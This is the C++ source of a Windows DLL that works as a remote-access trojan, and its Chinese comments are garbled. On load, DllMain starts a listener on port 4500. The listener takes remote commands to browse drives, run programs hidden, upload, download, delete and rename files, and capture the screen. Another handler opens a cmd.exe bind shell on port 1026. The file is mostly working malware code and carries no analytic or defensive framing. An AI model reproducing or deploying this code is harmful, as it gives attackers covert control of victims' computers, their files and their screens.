// test.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "test.h"
#include <windows.h>
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <afx.h>
#include <shellapi.h>
#pragma comment (lib,"ws2_32")	
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#define  BUF_LEN	1024
#endif

#define CHUNK_SIZE (64*1024)	//���ļ���Ϊ64K�鴫��


#define GetDriver	0x01
#define GetDirInfo	0x02
#define ExecFile	0x03
#define GetFile		0x04
#define PutFile		0x05
#define DelFile		0x06
#define DelDir		0x07
#define CreateDir	0x08
#define FileInfo	0x09
#define GetScreen	0x10
#define RenFile		0x11
#define RunCmdLine	0x12

typedef struct					//����ṹ
{
	int			ID;				//����ID
	BYTE		lparam[BUF_LEN*2]; 

}COMMAND;



typedef struct					//�ļ��ṹ
{
	char		FileName[MAX_PATH];
	int			FileLen;
	char		Time[50];
	BOOL		IsDir;
	BOOL		Error;
	HICON		hIcon;			//ͼ����

}FILEINFO;

BOOL DeleteDirectory(char *DirName);
DWORD WINAPI SLisen(LPVOID lparam);
HANDLE DDBtoDIB( HBITMAP bitmap, DWORD dwCompression, HPALETTE  hPal,DWORD * sizeimage) ;
BOOL CapScreen(LPTSTR FileName);//��������


DWORD	WINAPI SLisen	(LPVOID lparam);
DWORD	GetDriverProc	(COMMAND command,SOCKET client);
DWORD	GetDirInfoProc	(COMMAND command,SOCKET client);
DWORD	ExecFileProc	(COMMAND command,SOCKET client);
DWORD	DelFileProc		(COMMAND command,SOCKET client);
DWORD	FileInfoProc	(COMMAND command,SOCKET client);
DWORD   CreateDirProc	(COMMAND command,SOCKET client);
DWORD   DelDirProc		(COMMAND command,SOCKET client);
DWORD   GetFileProc		(COMMAND command,SOCKET client);
DWORD   PutFileProc		(COMMAND command,SOCKET client);
DWORD   GetScreenProc	(COMMAND command,SOCKET client);
DWORD   RenFileProc		(COMMAND command,SOCKET client);
DWORD   CmdLine	     	(COMMAND command,SOCKET client);


/////////////////////////////////////////////////////////////////////////////
// The one and only application object
using namespace std;

int srever_dll()
{

	WSADATA wsadata;
	SOCKET server;
	SOCKET client;
	SOCKADDR_IN serveraddr;
	SOCKADDR_IN clientaddr;
	int port=4500;
	BOOL val1 = TRUE;

	WORD ver=MAKEWORD(2,2);							//�ж�winsock�汾
	WSAStartup(ver,&wsadata);						//��ʼSOCKET

	server=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	setsockopt(server,SOL_SOCKET,SO_REUSEADDR,(char*)&val1, sizeof(val1));  

	serveraddr.sin_family=AF_INET;
	serveraddr.sin_port=htons(port);
	serveraddr.sin_addr.S_un.S_addr=htonl(ADDR_ANY);

	bind(server,(SOCKADDR*)&serveraddr,sizeof(serveraddr));
	
	Sleep(5000);
	listen(server,5);

	int len=sizeof(clientaddr);

	while(true)
	{
		if(client=accept(server,(sockaddr *)&clientaddr,&len))
		{
			cout<<"CreateThread is the ok \n";
			//CreateThread(NULL,NULL,SLisen,(LPVOID)client,NULL,NULL);
			SLisen((LPVOID)client);
		}
	}

	closesocket(server);
	closesocket(client);
	WSACleanup();
	return 0;
}

DWORD WINAPI SLisen(LPVOID lparam)
{
	SOCKET client=(SOCKET)lparam;
	
	COMMAND command;

	while(1)
	{
		memset((char*)&command,0,sizeof(command));
		if(recv(client,(char*)&command,sizeof(command),0)==SOCKET_ERROR)
		{
			cout<<"The Clinet Socket is Closed\n";
			break;
		}else
		{
			switch(command.ID)
				{
				case GetDriver:
					 GetDriverProc	(command,client);
					 break;
				case GetDirInfo:
					 GetDirInfoProc	(command,client);
					 break;
				case ExecFile:
					 ExecFileProc	(command,client);
					 break;
				case DelFile:
					 DelFileProc	(command,client);
					 break;
				case FileInfo:
					 FileInfoProc	(command,client);
					 break;
				case CreateDir:
					 CreateDirProc	(command,client);
					 break;
				case DelDir:
					 DelDirProc		(command,client);
					 break;
				case GetFile:
					 GetFileProc	(command,client);
					 break;
				case PutFile:
					 PutFileProc	(command,client);
					 break;
				case GetScreen:
					 GetScreenProc	(command,client);
					 break;
				case RenFile:
					 RenFileProc	(command,client);
					 break;
				case RunCmdLine:
					CmdLine         (command,client);
					break;
				}
		}
	}

	//closesocket(client);
	return 0;
}

DWORD   RenFileProc		(COMMAND command,SOCKET client)
{
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=RenFile;
	CString str,OldName, NewName;

	str = command.lparam;

	int idx=str.Find(',', 0);

	OldName=str.Left(idx);
	NewName = str.Right(str.GetLength()-idx-1);

	if(!rename(OldName, NewName))
	{
		strcpy((char*)cmd.lparam,"�������ļ�ִ��ʧ��!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	else
	{
		strcpy((char*)cmd.lparam,"�������ļ�ִ�гɹ�!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}

	return 0;
}

DWORD	GetDriverProc(COMMAND command,SOCKET client)
{
	cout<<"GetDriver is ok\n";

	COMMAND cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=GetDriver;

	for(char i='A';i<='Z';i++)
	{
		char x[20]={i,':'};

		UINT Type=GetDriveType(x);

		if(Type==DRIVE_FIXED||Type==DRIVE_REMOVABLE||Type==DRIVE_CDROM)

		{
			cout<<x<<"\n";
			memset((char*)&cmd.lparam,0,sizeof(cmd.lparam));
			strcpy((char*)&cmd.lparam,x);
			if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR)
			{
				cout << "Send Driver is Error\n";
			}
		}
	}
	return 0;
}


DWORD	GetDirInfoProc(COMMAND command,SOCKET client)
{
	cout<<"GetDir is ok\n";

	FILEINFO fi;
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	memset((char*)&fi,0,sizeof(fi));

	strcat((char*)command.lparam,"*.*");
	cout<<(char*)command.lparam<<"\n";

	CFileFind file;
	BOOL bContinue = file.FindFile((char*)command.lparam);

	while(bContinue)
	{
		memset((char*)&cmd,0,sizeof(cmd));
		memset((char*)&fi,0,sizeof(fi));

		bContinue = file.FindNextFile();
		if(file.IsDirectory())
		{
			fi.IsDir=true;
		}
		strcpy(fi.FileName,file.GetFileName().LockBuffer());
		cout<<fi.FileName<<"\n";

		cmd.ID=GetDirInfo;
		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

		if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR)
		{
			cout << "Send Dir is Error\n";
		}
	}

	return 0;
}


DWORD ExecFileProc (COMMAND command,SOCKET client)
{
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=ExecFile;

	if(ShellExecute(NULL,"open",(char*)command.lparam,NULL,NULL,SW_HIDE)<(HINSTANCE)32)
	{
		strcpy((char*)cmd.lparam,"�ļ�ִ��ʧ��!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	else
	{
		strcpy((char*)cmd.lparam,"�ļ�ִ�гɹ�!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}

	return 0;
}


DWORD DelFileProc (COMMAND command,SOCKET client)
{
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=DelFile;

	SetFileAttributes((char*)command.lparam,FILE_ATTRIBUTE_NORMAL); //ȥ���ļ���ϵͳ����������
	
	
	if(DeleteFile((char*)command.lparam)==0)
	{
		strcpy((char*)cmd.lparam,"�ļ�ɾ��ʧ��!");
		send(client,(char*)&cmd,sizeof(cmd),0);

	}
	else
	{
		strcpy((char*)cmd.lparam,"�ļ�ɾ���ɹ�!");
		send(client,(char*)&cmd,sizeof(cmd),0);

	}

	return 0;

}


DWORD	FileInfoProc	(COMMAND command,SOCKET client)
{
	cout<<"get fileinfo is ok\n";

	COMMAND	 cmd;
	FILEINFO fi;

	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));

	HANDLE hFile;

	WIN32_FIND_DATA WFD;

	memset((char*)&WFD,0,sizeof(WFD));


	if((hFile=FindFirstFile((char*)command.lparam,&WFD))==INVALID_HANDLE_VALUE)	//�鿴�ļ�����
	{
		fi.Error=true;
		return 0;
	}

	DWORD		FileLen;
	char		stime[32];
	SHFILEINFO	shfi;
	SYSTEMTIME	systime;
	FILETIME	localtime;

	memset(&shfi,0,sizeof(shfi));

	//�õ��ļ��������Ϣ
	SHGetFileInfo(WFD.cFileName, 
					FILE_ATTRIBUTE_NORMAL,
					&shfi, sizeof(shfi),
					SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );


	//д���ļ���Ϣ�ṹ
	strcpy(fi.FileName,(char*)command.lparam);					//�ļ�·��

	FileLen=(WFD.nFileSizeHigh*MAXDWORD+WFD.nFileSizeLow)/1024; //�ļ�����

	fi.FileLen=FileLen;

	//ת������ʱ�䵽����ʱ��
	FileTimeToLocalFileTime(&WFD.ftLastWriteTime,&localtime);
	FileTimeToSystemTime(&localtime,&systime);

	sprintf(stime,"%4d-%02d-%02d %02d:%02d:%02d",
			systime.wYear,systime.wMonth,systime.wDay,systime.wHour,
			systime.wMinute,systime.wSecond);

	strcpy(fi.Time,stime);									//�ļ�ʱ��


	//��ʱ��������ļ�����
	if(GetFileAttributes((char*)command.lparam)&FILE_ATTRIBUTE_HIDDEN)
	{
		fi.IsDir=true;	//�����ļ�
		cout<<"this file is hide\n";
	}else
	if(GetFileAttributes((char*)command.lparam)&FILE_ATTRIBUTE_READONLY)
	{
		cout<<"this is file is read\n";
		fi.Error=true;	//ֻ���ļ�
	}

	cmd.ID=FileInfo;

	memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

	send(client,(char*)&cmd,sizeof(cmd),0);

	FindClose(hFile);

	return 0;
}


DWORD   CreateDirProc	(COMMAND command,SOCKET client)
{
	cout <<"create dir id is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=CreateDir;

	if(::CreateDirectory((char*)command.lparam,NULL))
	{
		strcpy((char*)cmd.lparam,"����Ŀ¼�ɹ�!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	else
	{
		strcpy((char*)cmd.lparam,"����Ŀ¼ʧ��!�����������ļ����ļ���");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
	
	return 0;
}

DWORD DelDirProc (COMMAND command,SOCKET client)
{
	cout <<"del dir id is ok\n";
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=DelDir;

	cout<<(char*)command.lparam<<"\n";

	if(DeleteDirectory((char*)command.lparam)==TRUE)
	{
		strcpy((char*)cmd.lparam,"ɾ��Ŀ¼�ɹ�!");
		send(client,(char*)&cmd,sizeof(cmd),0);

	}
	else
	{
		strcpy((char*)cmd.lparam,"ɾ��Ŀ¼ʧ��!�������ļ���������");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}

	return 0;

}



BOOL DeleteDirectory(char *DirName)
{
   CFileFind tempFind;
   char tempFileFind[200];
   sprintf(tempFileFind,"%s*.*",DirName);
   BOOL IsFinded=(BOOL)tempFind.FindFile(tempFileFind);
   while(IsFinded)
   {
      IsFinded=(BOOL)tempFind.FindNextFile();
      if(!tempFind.IsDots())
      {
         char foundFileName[200];
         strcpy(foundFileName,tempFind.GetFileName().GetBuffer(200));
         if(tempFind.IsDirectory())
         {
            char tempDir[200];
            sprintf(tempDir,"%s\\%s",DirName,foundFileName);
            DeleteDirectory(tempDir);
         }
         else
         {
            char tempFileName[200];
            sprintf(tempFileName,"%s\\%s",DirName,foundFileName);
			SetFileAttributes(tempFileName,FILE_ATTRIBUTE_NORMAL); //ȥ���ļ���ϵͳ����������
            DeleteFile(tempFileName);
			cout <<"now delete "<<tempFileName<<"\n";
         }
      }
   }
   tempFind.Close();
   if(!RemoveDirectory(DirName))
   {
      return FALSE;
   }
   return TRUE;
}







DWORD  GetFileProc	(COMMAND command,SOCKET client)
{
	cout <<"get file proc is ok\n";

	COMMAND	 cmd;
	FILEINFO fi;
	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=GetFile;

	CFile	file;
	int		nChunkCount=0;	//�ļ�����

	if(file.Open((char*)command.lparam,CFile::modeRead|CFile::typeBinary))
	{
		cout <<(char*)command.lparam<<"\n";

		int FileLen=file.GetLength();

		fi.FileLen=file.GetLength();

		strcpy((char*)fi.FileName,file.GetFileName());

		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

		send(client,(char*)&cmd,sizeof(cmd),0);

		nChunkCount=FileLen/CHUNK_SIZE;
		
		if(FileLen%CHUNK_SIZE!=0)
			nChunkCount++;

		char *date=new char[CHUNK_SIZE];
		
		for(int i=0;i<nChunkCount;i++)						//�ֿ鷢��
		{
			cout<<"send the count"<<i<<"\n";
			int nLeft;

			if(i+1==nChunkCount)							//���һ��
				nLeft=FileLen-CHUNK_SIZE*(nChunkCount-1);
			else
				nLeft=CHUNK_SIZE;

			int idx=0;
			file.Read(date,CHUNK_SIZE);

			while(nLeft>0)
			{
				int ret=send(client,&date[idx],nLeft,0);
				if(ret==SOCKET_ERROR)
					cout<<"error \n";

				nLeft-=ret;
				idx+=ret;
			}
		}

		file.Close();
		delete[] date;

	}

	return 0;
}


DWORD  PutFileProc	(COMMAND command,SOCKET client)
{
	COMMAND	 cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=PutFile;

	FILEINFO *fi=(FILEINFO*)command.lparam;
	int		FileLen=fi->FileLen;
	CFile	file;
	int		nChunkCount=FileLen/CHUNK_SIZE;

	if(FileLen%CHUNK_SIZE!=0)
	{
		nChunkCount++;
	}

	if(file.Open(fi->FileName,CFile::modeWrite|CFile::typeBinary|CFile::modeCreate))
	{
			char *date = new char[CHUNK_SIZE];

			for(int i=0;i<nChunkCount;i++)
			{
				int nLeft;

				if(i+1==nChunkCount)						//���һ��
					nLeft=FileLen-CHUNK_SIZE*(nChunkCount-1);
				else
					nLeft=CHUNK_SIZE;

				int idx=0;

				while(nLeft>0)
				{
					int ret=recv(client,&date[idx],nLeft,0);

					if(ret==SOCKET_ERROR)
					{
						printf("recv file error\n");
						break;
					}
					idx+=ret;
					nLeft-=ret;
				}
				file.Write(date,CHUNK_SIZE);
			}
			file.Close();
			delete[] date;
			printf("�ļ��������\n");

			strcpy((char*)cmd.lparam,"�ļ��ϴ��ɹ�!");
			send(client,(char*)&cmd,sizeof(cmd),0);
	}else
	{
		strcpy((char*)cmd.lparam,"�ļ��ϴ�ʧ��!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}

/*	FILEINFO *fi=(FILEINFO*)command.lparam;

	CFile	file;


	int FileLen=fi->FileLen;

	if(file.Open(fi->FileName,CFile::modeWrite|CFile::typeBinary|CFile::modeCreate))
	{
		char *date = new char[FileLen];

		int nLeft=FileLen;

		int idx=0;

		while(nLeft>0)
		{
			int ret=recv(client,&date[idx],nLeft,0);

			if(ret==SOCKET_ERROR)
				cout<<"Recv Date Error\n";

			idx+=ret;
			nLeft-=ret;
		}
		file.Write(date,FileLen);

		file.Close();
		delete[] date;

		strcpy((char*)cmd.lparam,"�ļ��ϴ��ɹ�!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}else
	{
		strcpy((char*)cmd.lparam,"�ļ��ϴ�ʧ��!");
		send(client,(char*)&cmd,sizeof(cmd),0);
	}
*/
	return 0;
}

DWORD   CmdLine	     	(COMMAND command,SOCKET client)
{
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	BOOL val = TRUE;

	//��ʼ��wsa
	WSAStartup(MAKEWORD(2,2),&ws);
	//ע��Ҫ��WSASocket
	listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	setsockopt(listenFD,SOL_SOCKET,SO_REUSEADDR,(char*)&val, sizeof(val));  
	//��������830�˿�
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(1026);
	server.sin_addr.s_addr=ADDR_ANY;
	ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
	ret=listen(listenFD,2);
	//����ͻ�����830�˿ڣ���������
	int iAddrSize = sizeof(server);
	SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);

	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.wShowWindow = SW_SHOWNORMAL;
	
	si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD;
	char cmdLine[] = "cmd.exe";
	PROCESS_INFORMATION ProcessInformation;
	//��������	
	ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	closesocket(listenFD);
	return 0;
}



DWORD  GetScreenProc (COMMAND command,SOCKET client)
{
	cout <<"getscreev is ok\n";
	char path[MAX_PATH];
	GetTempPath(MAX_PATH,path);
	strcat(path,"Screen.bmp");
	CapScreen(path);			//��ȡ��Ļ��������ʱĿ¼


	COMMAND	 cmd;
	FILEINFO fi;
	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID=GetScreen;

	CFile	file;

	if(file.Open(path,CFile::modeRead|CFile::typeBinary))//������Ļ�ļ�
	{
		int FileLen=file.GetLength();

		fi.FileLen=file.GetLength();

		strcpy((char*)fi.FileName,file.GetFileName());

		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));

		send(client,(char*)&cmd,sizeof(cmd),0);

		char *date=new char[FileLen];
		
		int nLeft=FileLen;
		int idx=0;

		file.Read(date,FileLen);

		while(nLeft>0)
		{
			int ret=send(client,&date[idx],nLeft,0);
			if(ret==SOCKET_ERROR)
				cout<<"error \n";

			nLeft-=ret;
			idx+=ret;
		}
		file.Close();

		delete[] date;

	}

	return 0;
}






HANDLE DDBtoDIB( HBITMAP bitmap, DWORD dwCompression, HPALETTE  hPal,DWORD * sizeimage) 
{
    BITMAP            bm;
    BITMAPINFOHEADER    bi;
     LPBITMAPINFOHEADER     lpbi;
    DWORD            dwLen;
    HANDLE            hDib;
    HANDLE            handle;
    HDC             hdc;

    //��֧��BI_BITFIELDS����
    if( dwCompression == BI_BITFIELDS )
        return NULL;

    //�����ɫ��Ϊ�գ�����Ĭ�ϵ�ɫ��
    if (hPal==NULL)
        hPal = (HPALETTE) GetStockObject(DEFAULT_PALETTE );

    //��ȡλͼ��Ϣ
    GetObject(bitmap,sizeof(bm),(LPSTR)&bm);

    //��ʼ��λͼ��Ϣͷ
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth        = bm.bmWidth;
    bi.biHeight         = bm.bmHeight;
    bi.biPlanes         = 1;
    bi.biBitCount        = bm.bmPlanes * bm.bmBitsPixel;
    bi.biCompression    = dwCompression;
    bi.biSizeImage        = 0;
    bi.biXPelsPerMeter    = 0;
    bi.biYPelsPerMeter    = 0;
    bi.biClrUsed        = 0;
    bi.biClrImportant    = 0;

    //������Ϣͷ����ɫ����С
    int ncolors = (1 << bi.biBitCount); if( ncolors> 256 ) 
        ncolors = 0;
    dwLen  = bi.biSize + ncolors * sizeof(RGBQUAD);

    // we need a device context to get the dib from
    hdc = GetDC(NULL);
    hPal = SelectPalette(hdc,hPal,FALSE);
    RealizePalette(hdc);

    //Ϊ��Ϣͷ����ɫ�������ڴ�
    hDib = GlobalAlloc(GMEM_FIXED,dwLen);

    if (!hDib){
        SelectPalette(hdc,hPal,FALSE);
        ReleaseDC(NULL,hdc);
        return NULL;
    }

    lpbi = (LPBITMAPINFOHEADER)hDib;
    *lpbi = bi;
    //���� GetDIBits ����ͼ���С
    GetDIBits(hdc, bitmap, 0L, (DWORD)bi.biHeight,
            (LPBYTE)NULL, (LPBITMAPINFO)lpbi, (DWORD)DIB_RGB_COLORS );

    bi = *lpbi;
    //ͼ���ÿһ�ж�����(32bit)�߽�
	if (bi.biSizeImage == 0){
        bi.biSizeImage = ((((bi.biWidth * bi.biBitCount) + 31) & ~31) / 8) 
                        * bi.biHeight;
    if (dwCompression != BI_RGB)
            bi.biSizeImage = (bi.biSizeImage * 3) / 2;
    }

    //���·����ڴ��С���Ա������������
    dwLen += bi.biSizeImage;
    if (handle = GlobalReAlloc(hDib, dwLen, GMEM_MOVEABLE))
        hDib = handle;
    else{
        GlobalFree(hDib);

        //��ѡԭʼ��ɫ��
        SelectPalette(hdc,hPal,FALSE);
        ReleaseDC(NULL,hdc);
        return NULL;
    }

    //��ȡλͼ����
    lpbi = (LPBITMAPINFOHEADER)hDib;

    //���ջ�õ�DIB
    BOOL bgotbits = GetDIBits( hdc, bitmap,
                  0L,                      //ɨ������ʼ��
                (DWORD)bi.biHeight,      //ɨ������
                (LPBYTE)lpbi             //λͼ���ݵ�ַ
                + (bi.biSize + ncolors * sizeof(RGBQUAD)),
                (LPBITMAPINFO)lpbi,      //λͼ��Ϣ��ַ
                (DWORD)DIB_RGB_COLORS);  //��ɫ��ʹ��RGB

    if( !bgotbits )
    {
        GlobalFree(hDib);
        
        SelectPalette(hdc,hPal,FALSE);
        ReleaseDC(NULL,hdc);
		return NULL;
    }

    SelectPalette(hdc,hPal,FALSE);
    ReleaseDC(NULL,hdc);
	*sizeimage=bi.biSizeImage;
    return hDib;
} 

BOOL CapScreen(LPTSTR FileName)
{
	DWORD sizeimage;
	HDC hdc = CreateDC("DISPLAY", NULL, NULL, NULL); 
	HDC CompatibleHDC = CreateCompatibleDC(hdc); 
	HBITMAP BmpScreen = CreateCompatibleBitmap(hdc,GetDeviceCaps(hdc, HORZRES),GetDeviceCaps(hdc, VERTRES)); 
	SelectObject(CompatibleHDC, BmpScreen);
	BitBlt(CompatibleHDC,0,0,GetDeviceCaps(hdc, HORZRES), GetDeviceCaps(hdc, VERTRES),hdc,0,0,SRCCOPY);
	
	HANDLE	pbitmapwithoutfileh=DDBtoDIB(BmpScreen, BI_RGB,0,&sizeimage);
	BITMAPFILEHEADER bfh;
   //����λͼ��Ϣͷ�ṹ
	bfh.bfType = ((WORD)('M'<< 8)|'B');
	bfh.bfReserved1 = 0;
	bfh.bfReserved2 = 0;
	bfh.bfSize = 54+sizeimage;
	bfh.bfOffBits = 54;
	//����λͼ�ļ�    
	HANDLE  hFile=CreateFile(FileName,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	DWORD dwWrite;
	// д��λͼ�ļ�ͷ
	WriteFile(hFile,&bfh,sizeof(BITMAPFILEHEADER),&dwWrite,NULL);
	// д��λͼ�ļ���������
	WriteFile(hFile,pbitmapwithoutfileh,bfh.bfSize,&dwWrite,NULL);  
	DeleteDC(hdc);
   
	CloseHandle(CompatibleHDC);
	CloseHandle(hFile);

	return true;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			srever_dll();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}

// This is an example of an exported variable
TEST_API int nTest=0;

// This is an example of an exported function.
TEST_API int fnTest(void)
{
	return 42;
}

// This is the constructor of a class that has been exported.
// see test.h for the class definition
CTest::CTest()
{ 
	return; 
}

